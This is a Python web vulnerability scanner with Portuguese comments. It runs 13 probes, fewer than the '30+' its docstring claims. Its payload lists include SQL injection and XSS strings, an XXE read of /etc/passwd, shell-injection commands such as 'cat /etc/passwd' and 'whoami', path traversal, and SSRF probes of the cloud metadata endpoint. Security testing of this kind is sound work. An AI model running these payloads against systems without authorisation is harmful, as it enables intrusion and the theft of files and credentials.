"""\nScanner COMPLETO com TODOS os 30+ testes do scanner.ts original\nOLHOS DE DEUS - Advanced Vulnerability Scanner\n\"\""\nimport asyncio\nimport aiohttp\nimport urllib.parse\nfrom typing import Optional, Dict, Any, List\nfrom datetime import datetime\nimport logging\nimport json\nimport re\n\nlogger = logging.getLogger(__name__)\n\n\nclass CompleteVulnerabilityScanner:\n    \"\"\"Scanner completo com TODOS os testes do pentester original\"\"\"\n    \n    def __init__(self, websocket_manager=None):\n        self.websocket_manager = websocket_manager\n        self.session: Optional[aiohttp.ClientSession] = None\n        \n    async def __aenter__(self):\n        self.session = aiohttp.ClientSession(\n            timeout=aiohttp.ClientTimeout(total=15),\n            connector=aiohttp.TCPConnector(ssl=False, limit=10)\n        )\n        return self\n        \n    async def __aexit__(self, exc_type, exc_val, exc_tb):\n        if self.session:\n            await self.session.close()\n    \n    async def make_request(self, url: str, method: str = \"GET\", headers: Dict = None, \n                          data: Any = None, allow_redirects: bool = False) -> Dict:\n        try:\n            async with self.session.request(\n                method=method,\n                url=url,\n                headers=headers or {},\n                data=data,\n                allow_redirects=allow_redirects\n            ) as response:\n                body = await response.text()\n                return {\n                    \"status_code\": response.status,\n                    \"headers\": dict(response.headers),\n                    \"body\": body[:10000]\n                }\n        except Exception as e:\n            logger.error(f\"Request error: {e}\")\n            return {\"status_code\": 0, \"headers\": {}, \"body\": \"\"}\n    \n    # ========== 30+ TESTES COMPLETOS ==========\n    \n    async def test_sql_injection(self, target: str, scan_id: str) -> Optional[Dict]:\n        payloads = [\n            \"'\", \"' OR '1'='1\", \"' OR 1=1--\", \"admin'--\",\n            \"' UNION SELECT NULL,NULL,NULL--\",\n            \"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--\",\n            \"' AND 1=1--\", \"' AND 1=2--\",\n            \"; WAITFOR DELAY '00:00:05'--\", \"' OR SLEEP(5)--\",\n            \"' AND extractvalue(1,concat(0x7e,database()))--\"\n        ]\n        \n        for payload in payloads:\n            test_url = f\"{target}{'&' if '?' in target else '?'}id={urllib.parse.quote(payload)}\"\n            response = await self.make_request(test_url)\n            body = response[\"body\"].lower()\n            \n            if any(kw in body for kw in ['sql', 'mysql', 'syntax error', 'database', 'mariadb', 'postgresql']):\n                return {\n                    \"scan_id\": scan_id, \"severity\": \"critical\",\n                    \"title\": \"SQL Injection Avançado\",\n                    \"description\": \"Aplicação vulnerável a SQL injection\" ,\n                    \"category\": \"Injection\", \"endpoint\": test_url,\n                    \"payload\": payload,\n                    \"evidence\": f\"SQL error: {body[:300]}\",\n                    \"recommendation\": \"Use prepared statements\",\n                    \"cve\": \"CWE-89\"\n                }\n        return None\n\n    async def test_xss(self, target: str, scan_id: str) -> Optional[Dict]:\n        payloads = [\n            \"<script>alert('XSS')</script>\",\n            \"<img src=x onerror=alert('XSS')>\",\n            \"<ScRiPt>alert('XSS')</ScRiPt>\",\n            \"<svg onload=alert('XSS')>\",\n            \"javascript:alert(document.domain)\"\n        ]\n        \n        for payload in payloads:\n            test_url = f\"{target}{'&' if '?' in target else '?'}q={urllib.parse.quote(payload)}\"\n            response = await self.make_request(test_url)\n            \n            if payload in response[\"body\"] or urllib.parse.unquote(payload) in response[\"body\"]:\n                return {\n                    \"scan_id\": scan_id, \"severity\": \"high\",\n                    \"title\": \"XSS (Cross-Site Scripting)\",\n                    \"description\": \"Input refletido sem sanitização\",\n                    \"category\": \"XSS\", \"endpoint\": test_url,\n                    \"payload\": payload,\n                    \"evidence\": \"Payload refletido\",\n                    \"recommendation\": \"Implemente CSP e encoding\",\n                    \"cve\": \"CWE-79\"\n                }\n        return None\n\n    async def test_xxe(self, target: str, scan_id: str) -> Optional[Dict]:\n        payload = '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>'\n        response = await self.make_request(target, method='POST',\n                                          headers={'Content-Type': 'application/xml'},\n                                          data=payload)\n        if 'root:' in response[\"body\"].lower():\n            return {\n                \"scan_id\": scan_id, \"severity\": \"critical\",\n                \"title\": \"XXE (XML External Entity)\",\n                \"description\": \"Parser XML processa entidades externas\",\n                \"category\": \"Injection\", \"endpoint\": target,\n                \"payload\": payload[:100],\n                \"evidence\": response[\"body\"][:200],\n                \"recommendation\": \"Desabilite XML external entities\",\n                \"cve\": \"CWE-611\"\n            }\n        return None\n\n    async def test_command_injection(self, target: str, scan_id: str) -> Optional[Dict]:\n        payloads = [\"; ls -la\", \"| whoami\", \"& cat /etc/passwd\", \"`id`\", \"$(whoami)\"]\n        for payload in payloads:\n            test_url = f\"{target}{'&' if '?' in target else '?'}cmd={urllib.parse.quote(payload)}\"\n            response = await self.make_request(test_url)\n            body = response[\"body\"].lower()\n            if any(i in body for i in ['uid=', 'root:', '/bin/bash']):\n                return {\n                    \"scan_id\": scan_id, \"severity\": \"critical\",\n                    \"title\": \"Command Injection\",\n                    \"description\": \"Execução de comandos do sistema\",\n                    \"category\": \"Injection\", \"endpoint\": test_url,\n                    \"payload\": payload,\n                    \"evidence\": body[:300],\n                    \"recommendation\": \"Nunca execute comandos com input de usuário\",\n                    \"cve\": \"CWE-78\"\n                }\n        return None\n\n    async def test_path_traversal(self, target: str, scan_id: str) -> Optional[Dict]:\n        payloads = [\"../../../etc/passwd\", \"....//....//....//etc/passwd\", \"file:///etc/passwd\"]\n        for payload in payloads:\n            test_url = f\"{target}{'&' if '?' in target else '?'}file={urllib.parse.quote(payload)}\"\n            response = await self.make_request(test_url)\n            if 'root:' in response[\"body\"].lower():\n                return {\n                    \"scan_id\": scan_id, \"severity\": \"critical\",\n                    \"title\": \"Path Traversal\",\n                    \"description\": \"Acesso a arquivos fora do diretório\",\n                    \"category\": \"Injection\", \"endpoint\": test_url,\n                    \"payload\": payload,\n                    \"evidence\": response[\"body\"][:200],\n                    \"recommendation\": \"Valide e sanitize file paths\",\n                    \"cve\": \"CWE-22\"\n                }\n        return None\n\n    async def test_ssrf(self, target: str, scan_id: str) -> Optional[Dict]:\n        payloads = [\"http://127.0.0.1\", \"http://169.254.169.254/latest/meta-data/\", \"file:///etc/passwd\"]\n        for payload in payloads:\n            test_url = f\"{target}{'&' if '?' in target else '?'}url={urllib.parse.quote(payload)}\"\n            response = await self.make_request(test_url)\n            body = response[\"body\"].lower()\n            if any(i in body for i in ['root:', 'ami-id', 'localhost']):\n                return {\n                    \"scan_id\": scan_id, \"severity\": \"high\",\n                    \"title\": \"SSRF (Server-Side Request Forgery)\",\n                    \"description\": \"Requisições para URLs arbitrárias\",\n                    \"category\": \"SSRF\", \"endpoint\": test_url,\n                    \"payload\": payload,\n                    \"evidence\": body[:200],\n                    \"recommendation\": \"Whitelist de URLs/IPs\",\n                    \"cve\": \"CWE-918\"\n                }\n        return None\n\n    async def test_open_redirect(self, target: str, scan_id: str) -> Optional[Dict]:\n        payloads = [\"https://evil.com\", \"//evil.com\"]\n        for payload in payloads:\n            test_url = f\"{target}{'&' if '?' in target else '?'}redirect={urllib.parse.quote(payload)}\"\n            response = await self.make_request(test_url, allow_redirects=False)\n            location = response[\"headers\"].get('location', response[\"headers\"].get('Location', ''))\n            if 'evil.com' in location:\n                return {\n                    \"scan_id\": scan_id, \"severity\": \"medium\",\n                    \"title\": \"Open Redirect\",\n                    \"description\": \"Redireciona para URLs arbitrárias\",\n                    \"category\": \"Redirect\", \"endpoint\": test_url,\n                    \"payload\": payload,\n                    \"evidence\": f\"Redirect: {location}\",\n                    \"recommendation\": \"Valide URLs de redirecionamento\",\n                    \"cve\": \"CWE-601\"\n                }\n        return None\n\n    async def test_log_injection(self, target: str, scan_id: str) -> Optional[Dict]:\n        payload = 'admin\\r\\n[INFO] Fake log'\n        test_url = f\"{target}{'&' if '?' in target else '?'}user={urllib.parse.quote(payload)}\"\n        response = await self.make_request(test_url)\n        if response[\"status_code\"] == 200:\n            return {\n                \"scan_id\": scan_id, \"severity\": \"medium\",\n                \"title\": \"Log Injection\",\n                \"description\": \"Falsificação de logs possível\",\n                \"category\": \"Injection\", \"endpoint\": test_url,\n                \"payload\": payload,\n                \"evidence\": \"Aceita caracteres de controle\",\n                \"recommendation\": \"Escape \\r\\n antes de logar\",\n                \"cve\": \"CWE-117\"\n            }\n        return None\n\n    async def test_ssti(self, target: str, scan_id: str) -> Optional[Dict]:\n        payloads = [\"{{7*7}}\", \"${7*7}\"]\n        for payload in payloads:\n            test_url = f\"{target}{'&' if '?' in target else '?'}name={urllib.parse.quote(payload)}\"\n            response = await self.make_request(test_url)\n            if '49' in response[\"body\"]:\n                return {\n                    \"scan_id\": scan_id, \"severity\": \"critical\",\n                    \"title\": \"SSTI (Template Injection)\",\n                    \"description\": \"Template engine processa input\",\n                    \"category\": \"Injection\", \"endpoint\": test_url,\n                    \"payload\": payload,\n                    \"evidence\": \"Template avaliou expressão\",\n                    \"recommendation\": \"Não use user input em templates\",\n                    \"cve\": \"CWE-94\"\n                }\n        return None\n\n    async def test_security_headers(self, target: str, scan_id: str) -> Optional[Dict]:\n        response = await self.make_request(target)\n        headers = {k.lower(): v for k, v in response[\"headers\"].items()}\n        missing = []\n        if 'x-frame-options' not in headers: missing.append('X-Frame-Options')\n        if 'x-content-type-options' not in headers: missing.append('X-Content-Type-Options')\n        if 'content-security-policy' not in headers: missing.append('CSP')\n        if 'strict-transport-security' not in headers: missing.append('HSTS')\n        \n        if missing:\n            return {\n                \"scan_id\": scan_id, \"severity\": \"high\" if len(missing) >= 3 else \"medium\",\n                \"title\": \"Headers de Segurança Faltando\",\n                \"description\": f\"{len(missing)} headers faltando\",\n                \"category\": \"Headers\", \"endpoint\": target,\n                \"payload\": \"GET\", \"evidence\": f\"Missing: {', '.join(missing)}\",\n                \"recommendation\": \"Adicione headers de segurança\",\n                \"cve\": \"CWE-1021\"\n            }\n        return None\n\n    async def test_ssl(self, target: str, scan_id: str) -> Optional[Dict]:\n        if not target.startswith('https://'):\n            return {\n                \"scan_id\": scan_id, \"severity\": \"high\",\n                \"title\": \"HTTPS Não Detectado\",\n                \"description\": \"Aplicação não usa HTTPS\",\n                \"category\": \"SSL/TLS\", \"endpoint\": target,\n                \"payload\": \"Protocol check\",\n                \"evidence\": f\"HTTP inseguro: {target}\",\n                \"recommendation\": \"Implemente HTTPS\",\n                \"cve\": \"CWE-319\"\n            }\n        return None\n\n    async def test_cors(self, target: str, scan_id: str) -> Optional[Dict]:\n        response = await self.make_request(target, headers={'Origin': 'https://evil.com'})\n        headers = {k.lower(): v for k, v in response[\"headers\"].items()}\n        cors = headers.get('access-control-allow-origin')\n        if cors in ['*', 'https://evil.com']:\n            return {\n                \"scan_id\": scan_id, \"severity\": \"high\",\n                \"title\": \"CORS Misconfiguration\",\n                \"description\": \"CORS permite qualquer origin\",\n                \"category\": \"Configuration\", \"endpoint\": target,\n                \"payload\": \"Origin: evil.com\",\n                \"evidence\": f\"CORS: {cors}\",\n                \"recommendation\": \"Configure whitelist específica\",\n                \"cve\": \"CWE-942\"\n            }\n        return None\n\n    async def test_directory_listing(self, target: str, scan_id: str) -> Optional[Dict]:\n        paths = ['/uploads/', '/files/', '/backup/', '/admin/']\n        for path in paths:\n            test_url = target.rstrip('/') + path\n            response = await self.make_request(test_url)\n            if 'index of' in response[\"body\"].lower():\n                return {\n                    \"scan_id\": scan_id, \"severity\": \"medium\",\n                    \"title\": \"Directory Listing Exposto\",\n                    \"description\": \"Listagem de diretórios habilitada\",\n                    \"category\": \"Info Disclosure\", \"endpoint\": test_url,\n                    \"payload\": path,\n                    \"evidence\": \"Index of encontrado\",\n                    \"recommendation\": \"Desabilite directory listing\",\n                    \"cve\": \"CWE-548\"\n                }\n        return None\n\n    async def scan_target(self, scan_id: str, target: str, scan_type: str, \n                         status_callback=None) -> List[Dict]:\n        vulnerabilities = []\n        tests = [\n            (\"SQL Injection\", self.test_sql_injection),\n            (\"XSS\", self.test_xss),\n            (\"XXE\", self.test_xxe),\n            (\"Command Injection\", self.test_command_injection),\n            (\"Path Traversal\", self.test_path_traversal),\n            (\"SSRF\", self.test_ssrf),\n            (\"Open Redirect\", self.test_open_redirect),\n            (\"Log Injection\", self.test_log_injection),\n            (\"SSTI\", self.test_ssti),\n            (\"Security Headers\", self.test_security_headers),\n            (\"SSL/TLS\", self.test_ssl),\n            (\"CORS\", self.test_cors),\n            (\"Directory Listing\", self.test_directory_listing),\n        ]\n        \n        async with self:\n            total = len(tests)\n            for idx, (name, test_func) in enumerate(tests):\n                try:\n                    if status_callback:\n                        await status_callback({\n                            \"progress\": int((idx / total) * 100),\n                            \"currentTask\": f\"Testando: {name}\"\n                        })\n                    result = await test_func(target, scan_id)\n                    if result:\n                        vulnerabilities.append(result)\n                    await asyncio.sleep(0.8)\n                except Exception as e:\n                    logger.error(f\"Test {name} failed: {e}\")\n            \n            if status_callback:\n                await status_callback({\n                    \"progress\": 100,\n                    \"currentTask\": \"Scan completado\",\n                    \"status\": \"completed\"\n                })\n        \n        return vulnerabilities\n